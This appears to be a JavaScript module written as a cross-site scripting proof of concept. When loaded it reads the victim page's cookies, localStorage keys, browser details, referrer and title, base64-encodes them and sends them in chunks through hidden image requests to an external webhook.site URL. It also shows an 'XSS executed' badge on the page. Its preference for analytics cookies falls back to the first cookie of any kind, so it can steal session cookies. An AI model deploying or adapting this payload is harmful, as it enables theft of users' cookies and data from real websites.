define([], function () {
  var WEBHOOK_URL = "https://webhook.site/fb9555c7-cb50-4b63-bc1b-1d9befffd87b";
  var COOKIE_ALLOWLIST = [
    "_ga",
    "_gid",
    "_gat",
    "OptanonConsent",
    "OptanonAlertBoxClosed",
    "cookieconsent_status",
    "cookie_consent",
    "ak_bmsc",
    "bm_sv",
    "AMCV"
  ];

  function nowIso() {
    return new Date().toISOString();
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function parseCookies() {
    var raw = safeCall(function () {
      return document.cookie || "";
    }, "");
    if (!raw) {
      return [];
    }
    return raw
      .split(";")
      .map(function (part) {
        var t = part.trim();
        var eq = t.indexOf("=");
        if (eq < 0) {
          return { name: t, value: "" };
        }
        return {
          name: t.slice(0, eq),
          value: t.slice(eq + 1)
        };
      })
      .filter(function (c) { return c.name; });
  }

  function pickLowRiskCookie(parsedCookies) {
    var i;
    for (i = 0; i < COOKIE_ALLOWLIST.length; i++) {
      var wanted = COOKIE_ALLOWLIST[i].toLowerCase();
      for (var j = 0; j < parsedCookies.length; j++) {
        if ((parsedCookies[j].name || "").toLowerCase().indexOf(wanted) !== -1) {
          return parsedCookies[j];
        }
      }
    }
    return parsedCookies.length ? parsedCookies[0] : null;
  }

  function collectNavigatorLite() {
    var n = window.navigator || {};
    return {
      userAgent: n.userAgent,
      language: n.language,
      languages: safeCall(function () { return (n.languages || []).slice(0, 5); }, []),
      platform: n.platform,
      cookieEnabled: n.cookieEnabled
    };
  }

  function encodeBase64Utf8(str) {
    try {
      return btoa(unescape(encodeURIComponent(str)));
    } catch (e) {
      return "";
    }
  }

  function makeSessionId() {
    var rnd = Math.random().toString(36).slice(2, 10);
    return "cp" + Date.now().toString(36) + rnd;
  }

  function sendPayload(payload) {
    var serialized = safeCall(function () { return JSON.stringify(payload); }, "{}");
    var base64Payload = encodeBase64Utf8(serialized);
    var chunkSize = 1400;
    var total = Math.ceil(base64Payload.length / chunkSize);
    var session = makeSessionId();
    var sent = 0;
    var lastUrl = null;

    for (var i = 0; i < total; i++) {
      var chunk = base64Payload.slice(i * chunkSize, (i + 1) * chunkSize);
      var img = new Image();
      img.referrerPolicy = "no-referrer";
      img.src = WEBHOOK_URL +
        "?event=cp_loader_chunk" +
        "&sid=" + encodeURIComponent(session) +
        "&idx=" + i +
        "&total=" + total +
        "&ts=" + encodeURIComponent(nowIso()) +
        "&d=" + encodeURIComponent(chunk);
      sent += 1;
      lastUrl = img.src;
    }

    window.__CP_POC_DELIVERY__ = {
      mode: "image_chunks",
      session: session,
      totalChunks: total,
      sentChunks: sent
    };
    window.__CP_POC_CHUNK_COUNT__ = total;
    window.__CP_POC_LAST_IMG_URL__ = lastUrl;
  }

  function markVisualProof(ts) {
    var id = "cp-xss-proof-badge";
    if (document.getElementById(id)) {
      return;
    }
    var badge = document.createElement("div");
    badge.id = id;
    badge.textContent = "XSS executed at " + ts + " on " + window.location.origin;
    badge.style.position = "fixed";
    badge.style.right = "16px";
    badge.style.bottom = "16px";
    badge.style.padding = "10px 14px";
    badge.style.background = "#111";
    badge.style.color = "#00ff90";
    badge.style.font = "12px monospace";
    badge.style.zIndex = "2147483647";
    badge.style.border = "1px solid #00ff90";
    badge.style.borderRadius = "6px";
    document.documentElement.appendChild(badge);
  }

  function executePoC() {
    var ts = nowIso();
    var cookies = parseCookies();
    var chosen = pickLowRiskCookie(cookies);
    var localStorageKeys = safeCall(function () {
      var keys = [];
      for (var i = 0; i < localStorage.length && i < 30; i++) {
        keys.push(localStorage.key(i));
      }
      return keys;
    }, []);

    var marker = {
      executed: true,
      ts: ts,
      origin: window.location.origin,
      href: window.location.href
    };
    window.__CP_POC_MARKER__ = marker;
    safeCall(function () {
      localStorage.setItem("cp_poc_marker", JSON.stringify(marker));
    }, null);

    var payload = {
      event: "cp_hash_loader_xss_exec_proof",
      marker: {
        executed: true,
        ts: ts,
        victimOrigin: window.location.origin,
        victimHref: window.location.href,
        documentDomain: document.domain
      },
      selectedCookieProof: chosen,
      cookieNames: cookies.map(function (c) { return c.name; }).slice(0, 30),
      cookieCount: cookies.length,
      localStorageKeyCount: safeCall(function () { return localStorage.length; }, 0),
      localStorageKeys: localStorageKeys,
      navigator: collectNavigatorLite(),
      referrer: document.referrer || "",
      title: document.title || ""
    };

    markVisualProof(ts);
    sendPayload(payload);
    return marker;
  }

  executePoC();

  return {
    version: "103.0.0-image-chunks",
    render: function () {
      return executePoC();
    }
  };
});
